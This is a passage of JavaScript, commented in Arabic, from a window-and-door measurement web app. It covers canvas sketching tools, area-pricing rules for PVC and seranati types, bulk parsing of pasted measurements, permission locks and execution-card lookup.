            showMiniToast('✓ تم حفظ الرسم في المقاس مباشرة', '#047480');
          }
          drawingEditIndex = -1;
        } else {
          // رسم مقاس جديد: يبقى في اللوحة حتى يضغط المستخدم «إضافة للجدول».
          saveCurrentState();
        }
      }
      // إذا خرج المستخدم بلا حفظ من رسم صف، لا نحتفظ بهدف الرسم القديم؛
      // المقاس التالي يجب أن يبدأ مستقلاً تماماً.
      if (!save) drawingEditIndex = -1;
      document.getElementById('bigDrawModal').style.display = 'none';
      document.body.style.overflow = '';
    }

    function setDrawTool(tool) {
      drawTool = tool;
      if(bigCtx && tool !== 'eraser') bigCtx.globalCompositeOperation = 'source-over';
      document.querySelectorAll('.draw-tool-btn').forEach(b => {
        b.style.background = b.dataset.tool === tool ? 'var(--accent)' : 'rgba(255,255,255,0.14)';
      });
      // حقل المقاس الجاهز يظهر فقط مع أداة خط القياس، وحقل النص يظهر فقط مع أداة النص
      const measureBox = document.getElementById('measureValueInput');
      if(measureBox) measureBox.style.display = (tool === 'arrow') ? 'block' : 'none';
      const textBox = document.getElementById('drawTextValueInput');
      if(textBox) { textBox.style.display = (tool === 'text') ? 'block' : 'none'; if(tool === 'text') textBox.focus(); }
    }

    function pushUndo() {
      undoStack.push(bigCtx.getImageData(0, 0, bigCanvas.width, bigCanvas.height));
      if(undoStack.length > 15) undoStack.shift();
    }

    function undoBigCanvas() {
      if(undoStack.length <= 1) return;
      undoStack.pop();
      bigCtx.putImageData(undoStack[undoStack.length - 1], 0, 0);
    }

    function clearBigCanvas() { bigCtx.clearRect(0, 0, bigCanvas.width, bigCanvas.height); pushUndo(); }

    function bigPos(e) {
      const r = bigCanvas.getBoundingClientRect(), t = e.touches && e.touches[0];
      return { x: (t ? t.clientX : e.clientX) - r.left, y: (t ? t.clientY : e.clientY) - r.top };
    }

    function bigStart(e) {
      e.preventDefault();
      const p = bigPos(e);
      movedInGesture = false;
      if(drawTool === 'text') {
        // القيمة تُقرأ مباشرة من الحقل الملاصق لأدوات الرسم (بلا نافذة منبثقة): الضغط على الرسم يثبّت نقطة الارتكاز فوراً،
        // وأي سحب لاحق يحدد زاوية دوران النص لأي اتجاه (نقرة بسيطة بلا سحب = نص أفقي). الحقل لا يُفرَّغ بعد الوضع
        // حتى يمكن تكرار نفس النص في أكثر من مكان بلا إعادة كتابة
        const box = document.getElementById('drawTextValueInput');
        const txt = box ? box.value.trim() : '';
        if(!txt) { if(box) box.focus(); return; }
        pendingText = txt;
        shapeStart = p; shapeSnapshot = bigCtx.getImageData(0, 0, bigCanvas.width, bigCanvas.height); bigDrawing = true;
        return;
      }
      if(drawTool === 'pen' || drawTool === 'eraser') {
        // الممحاة تعمل بنفس أسلوب القلم الحر (رسم مستمر أثناء السحب)، لكن بوضع "محو" يزيل جزءاً من الرسمة بدل الرسم فوقها
        bigCtx.globalCompositeOperation = (drawTool === 'eraser') ? 'destination-out' : 'source-over';
        bigCtx.lineWidth = (drawTool === 'eraser' ? Math.max(18, penWidth * 6) : penWidth) * bigScale;
        bigCtx.beginPath(); bigCtx.moveTo(p.x, p.y); bigDrawing = true;
      }
      else { shapeStart = p; shapeSnapshot = bigCtx.getImageData(0, 0, bigCanvas.width, bigCanvas.height); bigDrawing = true; }
    }

    function bigMove(e) {
      if(!bigDrawing) return;
      e.preventDefault();
      const p = bigPos(e);
      movedInGesture = true;
      if(drawTool === 'pen' || drawTool === 'eraser') { bigCtx.lineTo(p.x, p.y); bigCtx.stroke(); return; }
      bigCtx.putImageData(shapeSnapshot, 0, 0);
      if(drawTool === 'arrow') drawDimensionArrow(shapeStart, p);
      else if(drawTool === 'realarrow') drawArrowLine(shapeStart, p);
      else if(drawTool === 'line') drawPlainLine(shapeStart, p);
      else if(drawTool === 'text') drawRotatedText(pendingText, shapeStart, p);
      else if(drawTool === 'lshape') drawLShape(shapeStart, p);
      else drawRectShape(shapeStart, p, drawTool === 'square');
    }

    function bigEnd() {
      if(!bigDrawing) return;
      // نقرة بسيطة على أداة النص دون أي سحب: ثبّت النص أفقياً بدون دوران (السحب لم يُحرّك شيئاً بعد ليُرسم)
      if(drawTool === 'text' && pendingText && !movedInGesture) drawRotatedText(pendingText, shapeStart, shapeStart);
      // إعادة وضع الرسم الطبيعي بعد انتهاء أي استخدام للممحاة، حتى لا تبقى الأدوات التالية تمحو بدل أن ترسم
      if(drawTool === 'eraser') bigCtx.globalCompositeOperation = 'source-over';
      bigDrawing = false; shapeStart = null; shapeSnapshot = null; pendingText = null; movedInGesture = false;
      pushUndo();
    }

    // خط قياس بسيط بين نقطتين (بلا رأس سهم): يكتب طوله بالسم بخط صغير جداً، دائماً خارج الخط وموازياً لاتجاهه
    // (فلا يقطع الخط حتى عند الرسم الرأسي)، ويتحدّث الرقم مباشرة أثناء السحب. إذا كتب المستخدم مقاساً جاهزاً
    // في الحقل، يُرسم الخط بطول ذلك المقاس فعلياً والسحب يحدد الاتجاه فقط، وإلا يُحتسب الطول من مسافة السحب
    // نفسها، بمرجع يصل حتى 700 سم
    function drawDimensionArrow(p1, p2) {
      const forcedCm = getMeasureValueInput();
      const dx = p2.x - p1.x, dy = p2.y - p1.y, len = Math.hypot(dx, dy);
      if(len < 1) return;
      let endP = p2, cm;
      if(forcedCm) {
        const ux = dx / len, uy = dy / len, pxLen = forcedCm * pxPerCm;
        endP = { x: p1.x + ux * pxLen, y: p1.y + uy * pxLen };
        cm = forcedCm.toFixed(1);
      } else {
        cm = (len / pxPerCm).toFixed(1);
      }
      bigCtx.save();
      bigCtx.lineWidth = penWidth * bigScale;
      bigCtx.beginPath(); bigCtx.moveTo(p1.x, p1.y); bigCtx.lineTo(endP.x, endP.y); bigCtx.stroke();

      const label = cm + ' سم';
      const mdx = endP.x - p1.x, mdy = endP.y - p1.y;
      let angle = Math.atan2(mdy, mdx);
      // نُبقي زاوية النص بين -90° و90° لتجنّب كتابته مقلوباً رأساً على عقب، مع الحفاظ على موازاته لاتجاه الخط دائماً
      if(angle > Math.PI / 2) angle -= Math.PI;
      if(angle < -Math.PI / 2) angle += Math.PI;

      const midX = (p1.x + endP.x) / 2, midY = (p1.y + endP.y) / 2;
      const fs = labelFontSize * bigScale;
      bigCtx.font = `bold ${Math.round(fs)}px Tajawal, sans-serif`;
      const w = bigCtx.measureText(label).width;
      const offset = fs * 0.9 + 5 * bigScale; // مسافة إزاحة النص خارج الخط

      // إزاحة عمودية على اتجاه الخط الفعلي (وليس عمودياً على الشاشة فقط) كي يبقى الرقم خارج الخط دائماً أياً كان ميله،
      // مع اختيار جهة الإزاحة بحيث تكون نحو الأعلى بصرياً قدر الإمكان (كما في الخط الأفقي التقليدي)
      const perpX = -Math.sin(angle), perpY = Math.cos(angle);
      const sign = perpY <= 0 ? 1 : -1;
      const lx = midX + perpX * offset * sign, ly = midY + perpY * offset * sign;

      bigCtx.save();
      bigCtx.translate(lx, ly);
      bigCtx.rotate(angle);
      bigCtx.textAlign = 'center'; bigCtx.textBaseline = 'middle';
      bigCtx.fillStyle = '#ffffff';
      bigCtx.fillRect(-w / 2 - 5 * bigScale, -fs * 0.65, w + 10 * bigScale, fs * 1.3);
      bigCtx.fillStyle = '#e34c39';
      bigCtx.fillText(label, 0, 0);
      bigCtx.restore();

      bigCtx.restore();
    }

    // خط مستقيم بسيط بين نقطتين بلا أي رقم قياس أو نص فوقه، لمن يريد فقط خطاً توضيحياً بدون كتابة طوله
    function drawPlainLine(p1, p2) {
      const len = Math.hypot(p2.x - p1.x, p2.y - p1.y);
      if(len < 1) return;
      bigCtx.save();
      bigCtx.lineWidth = penWidth * bigScale;
      bigCtx.beginPath(); bigCtx.moveTo(p1.x, p1.y); bigCtx.lineTo(p2.x, p2.y); bigCtx.stroke();
      bigCtx.restore();
    }

    // خط مستقيم برأس سهم عند نهايته (بدون أي رقم أو نص)، يفيد للإشارة إلى اتجاه أو موضع معيّن في الرسمة
    function drawArrowLine(p1, p2) {
      const dx = p2.x - p1.x, dy = p2.y - p1.y, len = Math.hypot(dx, dy);
      if(len < 1) return;
      bigCtx.save();
      bigCtx.lineWidth = penWidth * bigScale;
      bigCtx.beginPath(); bigCtx.moveTo(p1.x, p1.y); bigCtx.lineTo(p2.x, p2.y); bigCtx.stroke();

      const angle = Math.atan2(dy, dx);
      const headLen = Math.max(10, penWidth * 4) * bigScale;
      const headAngle = Math.PI / 7;
      bigCtx.beginPath();
      bigCtx.moveTo(p2.x, p2.y);
      bigCtx.lineTo(p2.x - headLen * Math.cos(angle - headAngle), p2.y - headLen * Math.sin(angle - headAngle));
      bigCtx.lineTo(p2.x - headLen * Math.cos(angle + headAngle), p2.y - headLen * Math.sin(angle + headAngle));
      bigCtx.closePath();
      bigCtx.fillStyle = bigCtx.strokeStyle;
      bigCtx.fill();
      bigCtx.restore();
    }

    function drawRectShape(p1, p2, square) {
      let w = p2.x - p1.x, h = p2.y - p1.y;
      if(square) { const s = Math.max(Math.abs(w), Math.abs(h)); w = Math.sign(w) * s; h = Math.sign(h) * s; }
      bigCtx.save();
      bigCtx.lineWidth = penWidth * bigScale;
      bigCtx.strokeRect(p1.x, p1.y, w, h);
      bigCtx.restore();
    }

    // نص قابل للتدوير: p1 نقطة الارتكاز، واتجاه السحب نحو p2 يحدد زاوية الدوران لأي جهة (نقرة بدون سحب = نص أفقي عادي)
    function drawRotatedText(text, p1, p2) {
      if(!text) return;
      const dx = p2.x - p1.x, dy = p2.y - p1.y;
      const angle = Math.hypot(dx, dy) < 4 ? 0 : Math.atan2(dy, dx);
      bigCtx.save();
      bigCtx.font = `bold ${Math.round(labelFontSize * bigScale)}px Tajawal, sans-serif`;
      bigCtx.translate(p1.x, p1.y);
      bigCtx.rotate(angle);
      bigCtx.fillText(text, 0, 0);
      bigCtx.restore();
    }

    // زاوية على شكل حرف L: خطان متعامدان يلتقيان عند نقطة الارتكاز p1، ويدوران معاً تلقائياً لتتبع اتجاه السحب لأي جهة
    function drawLShape(p1, p2) {
      const dx = p2.x - p1.x, dy = p2.y - p1.y, len = Math.hypot(dx, dy);
      if(len < 1) return;
      const ang = Math.atan2(dy, dx), ang2 = ang + Math.PI / 2;
      bigCtx.save();
      bigCtx.lineWidth = penWidth * bigScale;
      bigCtx.beginPath();
      bigCtx.moveTo(p1.x + len * Math.cos(ang2), p1.y + len * Math.sin(ang2));
      bigCtx.lineTo(p1.x, p1.y);
      bigCtx.lineTo(p1.x + len * Math.cos(ang), p1.y + len * Math.sin(ang));
      bigCtx.stroke();
      bigCtx.restore();
    }

    // بيفيسي: نفس المنطق كما هو (نصف متر تحت 50، نسبة تحت 70، متر كامل حتى 100، ثم المساحة الفعلية)
    // وأي نوع آخر يُضاف لاحقاً يتبع نفس منطق البيفيسي أيضاً، ما عدا سرانتي الذي له منطقه الخاص أدناه
    function calculateLogic(w, h, type) {
      // إصلاح 8.8: المقاسات المكتوبة بالأرقام العربية كانت تُحسب صفراً
      let width = wsNum(w); let height = wsNum(h);
      // كل نوع مضاف أو إضافة سريعة يتبع طريقة السرانتي أو البيفيسي حسب ما اختير له
      type = resolveTypeId(type);
      const customSystem=window.WSSystems?.get(type);
      if(customSystem?.enabled){const result=window.WSSystems.calculate(customSystem,width,height);if(result!==null)return result;}
      const def = getExtraTypes().find(t => t.id === type) || getCustomTypes().find(t => t.id === type);
      if (type === 'seranati' || (def && def.calc === 'ser')) {
        // سرانتي: أي مقاس أقل من 100 سم (بالعرض والارتفاع معاً) يُحتسب متراً واحداً كاملاً كحد أدنى
        if (width < 100 && height < 100) return "1.00";
        return ((Math.max(width, 100) * Math.max(height, 100)) / 10000).toFixed(2);
      }
      if (width < 50 && height < 50) return "0.50";
      if (width < 70 && height < 70) return (Math.max(width, height) / 100).toFixed(2);
      if (width <= 100 && height <= 100) return "1.00";
      return ((Math.max(width, 100) * Math.max(height, 100)) / 10000).toFixed(2);
    }

    /* ============================================================
       لصق مجموعة مقاسات دفعة واحدة
       ------------------------------------------------------------
       كل سطر = مقاس مستقل يُضاف كصف في الجدول.
       الفاصل المقبول: *  ×  x  X  في أي منها، مع أو بدون مسافات.
       أي كلام بعد المقاس في نفس السطر = ملاحظة تُسجَّل تحت المقاس
       في الجدول (نفس مكان حقل "ملاحظات إضافية").
       الأرقام العربية (٠١٢٣) تُقبل وتُحوَّل تلقائياً.
       ============================================================ */

    // ٠١٢٣٤٥٦٧٨٩ و ۰۱۲۳۴۵۶۷۸۹ إلى 0123456789 + إزالة محارف الاتجاه الخفية
    function normalizeDigits(str) {
      return String(str || '')
        // محارف اتجاه غير مرئية تأتي مع النسخ من التطبيقات العربية
        .replace(/[\u200E\u200F\u061C\u202A-\u202E\u2066-\u2069\uFEFF]/g, '')
        .replace(/\u00A0/g, ' ')     // مسافة غير قابلة للكسر → مسافة عادية
        .replace(/[\u0660-\u0669]/g, d => String(d.charCodeAt(0) - 0x0660))
        .replace(/[\u06F0-\u06F9]/g, d => String(d.charCodeAt(0) - 0x06F0))
        .replace(/\u066B/g, '.');   // الفاصلة العشرية العربية
    }

    // يفصل السطر إلى { w, h, note } أو null إن لم يكن مقاساً صالحاً
    function parseBulkLine(rawLine) {
      const line = normalizeDigits(rawLine).trim();
      if (!line) return null;
      // رقم [فاصل] رقم ثم أي بقية = ملاحظة
      const natural=line.match(/^(.*?)عرض\s*(\d+(?:[.]\d+)?)\s*(?:سم)?[،, ]*ارتفاع\s*(\d+(?:[.]\d+)?)\s*(?:سم)?(.*)$/);
      if(natural){const w=natural[2],h=natural[3];if(!(Number(w)>0&&Number(h)>0))return {bad:true,raw:rawLine};const note=[natural[1],natural[4]].filter(Boolean).join(' ').trim();const countMatch=note.match(/عدد\s*(\d+)/);const count=countMatch?Number(countMatch[1]):/نافذتين|بابين/.test(note)?2:1;if(!(count>=1&&count<=100))return {bad:true,raw:rawLine};return {w,h,note,count};}
      const m = line.match(/^\s*(\d+(?:[.,]\d+)?)\s*[*x×X\u00D7]\s*(\d+(?:[.,]\d+)?)\s*(.*)$/);
      if (!m) return { bad: true, raw: rawLine.trim() };
      const w = m[1].replace(',', '.');
      const h = m[2].replace(',', '.');
      if (!(wsNum(w) > 0) || !(wsNum(h) > 0)) return { bad: true, raw: rawLine.trim() };   // إصلاح 8.8
      // تنظيف الملاحظة من علامات فصل شائعة في البداية
      const note = (m[3] || '').replace(/^[\s\-–—:,.\u060C]+/, '').trim();
      return { w, h, note };
    }

    function parseBulkInput() {
      const el = document.getElementById('bulkInput');   // عنصر قديم أُزيل — حماية
      const raw = (el && el.value) || '';
      return raw.split(/\r?\n/).map(parseBulkLine).filter(Boolean);
    }

    // لون كل نوع (للرأس الملوّن فوق كل مربع)
    function typeColor(id) {
      if (id === 'pvc') return '#16874f';
      if (id === 'seranati') return '#0e91a0';
      if(id === 'pvc') return '#147d49';
      if(id === 'seranati') return '#0e91a0';
      const t = getCustomTypes().concat(getExtraTypes()).find(x => x.id === id);
      return (t && t.color) || '#6e7471';
    }

    /* يبني مربعاً لكل نوع متاح، مع اسم النوع واضحاً فوقه.
       يُستدعى عند فتح الصندوق وبعد أي إضافة/تعديل/حذف نوع،
       مع الحفاظ على ما كتبه المستخدم في المربعات الموجودة. */
    function renderBulkPanes() {
      const grid = document.getElementById('bulkGrid');
      if (!grid) return;

      // نحفظ المحتوى الحالي قبل إعادة البناء حتى لا يضيع ما كُتب
      const kept = {};
      grid.querySelectorAll('textarea[data-type]').forEach(ta => { kept[ta.dataset.type] = ta.value; });

      const defs = getAllTypeDefs().filter(d => !d.extra || d.asType);
      grid.innerHTML = defs.map(d => {
        const c = typeColor(d.id);
        return `
        <div class="bulk-pane" data-pane="${escHtml(d.id)}" style="border-color:${safeColor(c)};">
          <div class="bulk-pane-head" style="background:${safeColor(c)};">
            <span class="bph-name"><i class="fas fa-layer-group"></i> ${escapeHtml(d.name)}</span>
            <span class="bph-count" data-count="${escHtml(d.id)}">0</span>
          </div>
          <textarea rows="5" data-type="${escHtml(d.id)}"
            placeholder="80*90&#10;70*70 ملاحظة"
            oninput="updateBulkPreview()"></textarea>
          <div class="bulk-pane-prev" data-prev="${escHtml(d.id)}"></div>
        </div>`;
      }).join('');

      // إعادة ما كان مكتوباً
      grid.querySelectorAll('textarea[data-type]').forEach(ta => {
        if (kept[ta.dataset.type] !== undefined) ta.value = kept[ta.dataset.type];
      });

      updateBulkPreview();
    }

    function toggleBulkPaste() {
      const box = document.getElementById('bulkPasteBox');
      box.classList.toggle('open');
      if (box.classList.contains('open')) {
        renderBulkPanes();
        setTimeout(() => {
          const first = document.querySelector('#bulkGrid textarea');
          if (first) first.focus();
        }, 220);
      }
    }

    function clearBulkPaste() {
      document.querySelectorAll('#bulkGrid textarea[data-type]').forEach(ta => { ta.value = ''; });
      updateBulkPreview();
      const first = document.querySelector('#bulkGrid textarea');
      if (first) first.focus();
    }

    // يقرأ كل المربعات ويعيد { typeId: [صفوف] }
    function parseAllBulkPanes() {
      const out = {};
      document.querySelectorAll('#bulkGrid textarea[data-type]').forEach(ta => {
        out[ta.dataset.type] = (ta.value || '').split(/\r?\n/).map(parseBulkLine).filter(Boolean).flatMap(r=>r.bad?[r]:Array.from({length:r.count||1},()=>({...r}))); 
      });
      return out;
    }

    // معاينة حيّة لكل مربع على حدة + عدّاد في رأسه
    function updateBulkPreview() {
      const byType = parseAllBulkPanes();
      let totalGood = 0;

      Object.keys(byType).forEach(typeId => {
        const rows = byType[typeId];
        const good = rows.filter(r => !r.bad);
        totalGood += good.length;

        const cnt = document.querySelector(`[data-count="${typeId}"]`);
        if (cnt) cnt.textContent = good.length;

        const prev = document.querySelector(`[data-prev="${typeId}"]`);
        if (prev) prev.innerHTML = rows.map(r => r.bad
          ? `<span class="bp-chip bad" title="سطر غير مفهوم"><i class="fas fa-triangle-exclamation"></i> ${escHtml(r.raw)}</span>`
          : `<span class="bp-chip"><span class="bp-dim">${escHtml(r.w)} × ${escHtml(r.h)}</span>` +
            (r.note ? `<span class="bp-note">${escHtml(r.note)}</span>` : '') + `</span>`
        ).join('');
      });

      const btn = document.querySelector('.bulk-add');
      const label = document.getElementById('bulkAddLabel');
      if (btn) btn.disabled = totalGood === 0;
      if (label) label.textContent = totalGood
        ? `إضافة ${totalGood} ${totalGood === 1 ? 'مقاس' : 'مقاسات'} للجدول`
        : 'إضافة الكل للجدول';
    }

    function addBulkMeasurements() {
      if (isSheetLocked()) { showMiniToast('🔒 الكراسة محفوظة. للتعديل اضغط «تعديل وإضافة مقاسات» أسفل الجدول.', '#16477f'); return; }   // كراسة محفوظة: لا كتابة قبل فتحها صراحةً
      if (isSheetIdleLocked()) { alert(idleLockMessage()); return; }   // 9.7.0 — قفل بعد اكتمال الرفع
      if (editingIndex > -1) { alert('⚠️ يرجى إنهاء تعديل العنصر الحالي أولاً'); return; }

      const byType = parseAllBulkPanes();
      const allBad = [];
      let totalGood = 0;
      Object.keys(byType).forEach(t => {
        byType[t].forEach(r => { if (r.bad) allBad.push({ t, raw: r.raw }); else totalGood++; });
      });

      if (!totalGood) {
        alert('لم يُعثر على أي مقاس صالح.\nاكتب كل مقاس في سطر داخل مربع نوعه، مثل: 80*90');
        return;
      }

      if (allBad.length) {
        const list = allBad.slice(0, 5).map(b => `• [${getTypeName(b.t)}] ${b.raw}`).join('\n');
        const more = allBad.length > 5 ? `\n… و${allBad.length - 5} سطر آخر` : '';
        if (!confirm(`سيُضاف ${totalGood} مقاساً.\n\nهذه الأسطر غير مفهومة وسيتم تجاهلها:\n${list}${more}\n\nهل تريد المتابعة؟`)) return;
      }

      // اللون/السكة المكتوبان في الأعلى يُطبَّقان على نوعهما فقط
      const sk = (document.getElementById('sk') || {}).value || '';
      const pcolor = (document.getElementById('pcolor') || {}).value || '';

      // نحافظ على ترتيب الأنواع كما تظهر المربعات
      getAllTypeDefs().forEach(d => {
        const rows = (byType[d.id] || []).filter(r => !r.bad);
        rows.forEach(r => {
          jobList.push(stampNewItem({
            type: d.id,
            w: r.w,
            h: r.h,
            note: r.note || '',                    // تُعرض تحت المقاس في الجدول
            img: '',
            res: calculateLogic(r.w, r.h, d.id),
            sel: true,
            sk: d.id === 'seranati' ? (sk || 'سكة') : '',
            itemColor: d.id === 'pvc' ? (pcolor || '') : ''
          }));
          if (r.note && !noteHistory.includes(r.note)) {
            noteHistory.push(r.note);
            safeSetItem('note_history', JSON.stringify(noteHistory));
          }
        });
      });

      ensureOrderIndices();
      renderTable();
      saveCurrentState();
      clearBulkPaste();

      const tbl = document.getElementById('mainTable');
      if (tbl) tbl.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
    }

    /* ══ قائمة اختيار الأنواع ══
       تُفتح حين يُضغط «إضافة للجدول» بلا تأشير أي نوع. تُظهر الأنواع
       المتاحة كلها، ويؤشّر المستخدم واحداً أو أكثر ثم يضيف من داخلها —
       فلا يخرج من سياق ما كان يفعله. */
    /* ══ قائمة الأنواع المنسدلة ══
       التأشير المسبق صار اختيارياً لا شرطاً: من يعرف نوعه يؤشّره من هنا
       قبل الإضافة، ومن ينسى تظهر له القائمة بعد الضغط. */
    /* ══ قائمة الأدوات ══
       أدوات تُستعمل مرة أو مرتين في اليوم: نسخ قوائم القص، والإرسال
       لحاسبة القص، واللصق الجماعي. تُفتح عند الطلب وتُغلق بالضغط خارجها. */
    function toggleToolsMenu(e) {
      if (e) e.stopPropagation();
      const m = document.getElementById('toolsMenu');
      const c = document.getElementById('toolsCaret');
      if (!m) return;
      const open = m.style.display === 'none';
      m.style.display = open ? '' : 'none';
      if (c) c.style.transform = open ? 'rotate(180deg)' : '';
      if (open) { try { renderCopyButtons(); } catch (err) {} }
    }
    function wsNewExecutionId(){const bytes=new Uint8Array(8);if(window.crypto?.getRandomValues)window.crypto.getRandomValues(bytes);else for(let i=0;i<8;i++)bytes[i]=Math.floor(Math.random()*256);return 'L'+Array.from(bytes,b=>b.toString(16).padStart(2,'0')).join('').toUpperCase();}
    function wsChooseExecutionSymbol(idx){
      const row=jobList[idx];if(!row)return;
      if(isSheetLocked()||isSheetIdleLocked()||!canEditItem(row)){alert('افتح الكراسة للتعديل أو راجع المدير لصلاحية هذا المقاس');return;}
      closeTypePicker();
      const ov=document.createElement('div');ov.id='typePickerOverlay';ov.className='tp-overlay';
      ov.innerHTML='<div class="tp-box" role="dialog"><h3>تغيير الرمز ومعادلة القص</h3><div class="ws-type-option"><input type="checkbox" class="tp-cb" checked hidden value="'+escHtml(row.type)+'"><div class="ws-formula-choice"></div></div><div class="tp-actions"><button type="button" class="tp-btn tp-cancel">إلغاء</button><button type="button" class="tp-btn ws-save-choice">حفظ الرمز والمعادلة</button><button type="button" class="tp-btn ws-layout-choice">التقسيم الداخلي والتنفيذ</button></div></div>';
      document.body.append(ov);wsRenderFormulaChoices();
      const box=ov.querySelector('.ws-formula-choice');box.wsFormulaChoice={key:row.cuttingFormula||'',label:row.formulaLabel||'',symbol:row.cuttingSymbol||'',symbolLabel:row.symbolLabel||'',side:row.openingDirection||''};
      box.wsSetChoice?.(box.wsFormulaChoice);
      const select=box.querySelector('.ws-optional-formula');if(select)select.value=row.cuttingFormula||'';
      ov.querySelector('.tp-cancel').onclick=()=>closeTypePicker();
      ov.querySelector('.ws-layout-choice').onclick=()=>{if(box.wsChoiceTouched)ov.querySelector('.ws-save-choice').onclick();else{closeTypePicker();wsExecutionLayout(idx);}};
      ov.querySelector('.ws-save-choice').onclick=()=>{
       if(isSheetLocked()||isSheetIdleLocked()||!canEditItem(row)){alert('لا تملك صلاحية تعديل هذا المقاس');return;}
       try{const choice=box.wsFormulaChoice;const next={...row,formulaSnapshot:null,openingLayout:null,cuttingSymbol:'',symbolLabel:'',openingSymbol:'',leafLayout:''};
       wsApplyFormula(next,choice||{key:'',label:''});next.formulaSnapshot=window.WSStudio?.snapshot(next)||null;next.editedAt=Date.now();next.editedBy=currentUserName();Object.assign(row,next);saveCurrentState();renderTable();closeTypePicker();wsExecutionLayout(idx);}catch(e){alert(e.message);}
      };
    }
    function wsExecutionDetails(idx){
      const row=jobList[idx];if(!row)return;
      if(!canEditItem(row)||sheetApproval){alert('لا يمكن تعديل هذا المقاس بصلاحياتك الحالية أو بعد اعتماد الخدمة');return;}
      if(isSheetLocked())unlockArchivedSheet();
      if(isSheetIdleLocked()){if(isManagerUser())unlockIdleSheet();else{alert(idleLockMessage());return;}}
      wsExecutionLayout(idx);
    }
    function wsExecutionLayout(idx){
      const row=jobList[idx];if(!row)return;const allowed=()=>!isSheetLocked()&&!isSheetIdleLocked()&&canEditItem(row);
      window.WSEngineUI.editOpening(row,draft=>{if(!allowed())throw Error('انتهت صلاحية تعديل هذا المقاس');const next={...draft,executionId:row.executionId||wsNewExecutionId(),editedAt:Date.now(),editedBy:currentUserName()};const layoutChanged=JSON.stringify(row.openingLayout)!==JSON.stringify(next.openingLayout);if(layoutChanged&&row.formulaSnapshot&&!confirm('تغيير التقسيم سيعيد تثبيت معادلة المقاس بقواعد النظام الحالية. متابعة؟'))return;if(layoutChanged||!row.formulaSnapshot)next.formulaSnapshot=window.WSStudio.snapshot(next);Object.assign(row,next);saveCurrentState();renderTable();},allowed(),()=>wsChooseExecutionSymbol(idx));
    }
    function wsFindExecutionCard(){const text=prompt('رقم بطاقة التنفيذ أو النص المقروء من QR');if(!text)return;const id=text.match(/L[0-9A-F]{16}/i)?.[0].toUpperCase();if(!id){alert('رقم بطاقة غير صالح');return;}const current=jobList.filter(r=>r.executionId===id);if(current.length){window.WSEngineUI.cards(current,document.getElementById('custName').value);return;}const matches=(archives||[]).filter(a=>!a.deleted).flatMap(a=>(a.data?.jobList||[]).filter(r=>r.executionId===id).map(r=>({row:r,name:a.data.custName||a.name})));if(matches.length===1)window.WSEngineUI.cards([matches[0].row],matches[0].name);else alert(matches.length?'يوجد أكثر من تطابق؛ راجع الكراسة':'لم تُعثر على البطاقة في الكراسات المحمّلة على هذا الجهاز');}
    function wsExecutionCards(){window.WSEngineUI.cards(jobList,document.getElementById('custName').value);}
    function wsPersonalPreferences(){window.WSEngineUI.preferences(currentUserUid(),getAllTypeDefs(),()=>{closeTypePicker();renderTable();});}
    function wsRefreshSelectedFormulas(){
      if(isSheetLocked()||isSheetIdleLocked()){alert('افتح الكراسة للتعديل أولًا');return;}const selected=jobList.filter(r=>r.sel);if(!selected.length){alert('حدد المقاسات المطلوب تحديثها');return;}if(selected.some(r=>!canEditItem(r))){alert('لا تملك صلاحية تعديل جميع المقاسات المحددة');return;}
      try{const snaps=selected.map(r=>window.WSStudio.snapshot(r));if(!confirm('تحديث معادلات '+selected.length+' مقاس محدد إلى الإعدادات الحالية؟'))return;selected.forEach((r,i)=>{r.formulaSnapshot=snaps[i];r.editedAt=Date.now();r.editedBy=currentUserName();});saveCurrentState();renderTable();}catch(e){alert(e.message);}
    }
    function wsReviewCurrentSheet(){
      closeToolsMenu();const d=document.createElement('dialog');d.dir='rtl';d.style.cssText='width:min(800px,94vw);max-height:85vh;overflow:auto;padding:20px';
      const title=document.createElement('h2');title.textContent='مراجعة الكراسة قبل القص';const out=document.createElement('pre');out.style.whiteSpace='pre-wrap';const issues=window.WSStudio.audit(jobList);out.textContent=issues.length?issues.join('\n'):'لا توجد أبعاد غير صالحة أو معادلات ناقصة أو صفوف متشابهة في هذا الفحص.';
      const b=document.createElement('button');b.textContent='إغلاق';b.onclick=()=>{d.close();d.remove();};d.append(title,out,b);document.body.append(d);d.showModal();
    }
    function closeToolsMenu() {
      const m = document.getElementById('toolsMenu');
      const c = document.getElementById('toolsCaret');
      if (m) m.style.display = 'none';
      if (c) c.style.transform = '';
    }

    // فتح صندوق اللصق من القائمة: يُظهره ويفتحه ويمرّر الشاشة إليه
    function openBulkFromTools() {
      closeToolsMenu();
      const box = document.getElementById('bulkPasteBox');
      if (!box) return;
      box.style.display = '';
      try {
        const body = document.getElementById('bulkBody');
        if (body && !body.classList.contains('open')) toggleBulkPaste();
      } catch (e) {}
      box.scrollIntoView({ behavior: 'smooth', block: 'start' });
    }

    // إغلاق القائمة بالضغط خارجها
    document.addEventListener('click', function (ev) {
      const m = document.getElementById('toolsMenu');
      if (!m || m.style.display === 'none') return;
      if (m.contains(ev.target)) return;
      if (ev.target.closest && ev.target.closest('.tools-btn')) return;
      closeToolsMenu();
    }, true);

    // v329: رموز هندسية صغيرة تُرسم محلياً، ولا تُحمّل صوراً من الإنترنت.
    const WS_OPENING_SYMBOLS = Object.freeze({
      'window-two':['نافذة ضلفتين','window',.5], 'window-right':['نافذة يمين','window',1],
      'window-left':['نافذة يسار','window',0], 'door-right':['باب يمين','door',1],
      'door-left':['باب يسار','door',0], 'door-two-equal':['باب ضلفتين متساويتين','door2',.5],
      'door-two-right':['باب ضلفتين اليمين أكبر','door2',.65],
      'door-two-left':['باب ضلفتين اليسار أكبر','door2',.35]
    });
    function wsSymbolSvg(key) {
      const item = WS_OPENING_SYMBOLS[key]; if (!item) return '';
      const [,kind,split] = item, x = Math.round(8 + 64*split);
      const partition = kind === 'door2' || key === 'window-two' ? `<path d="M${x} 8V54"/>` : '';
      const left = split === 0 || (kind === 'door2' && split <= .5);
      const hingeX = left ? 8 : 72, tipX = left ? 60 : 20;
      const leaf = kind === 'door2' || key === 'window-two'
        ? `<path d="M8 8L${x} 54L${x} 8 M72 8L${x} 54" stroke-dasharray="3 2"/>`
        : `<path d="M${hingeX} 8L${tipX} 54" stroke-dasharray="3 2"/>`;
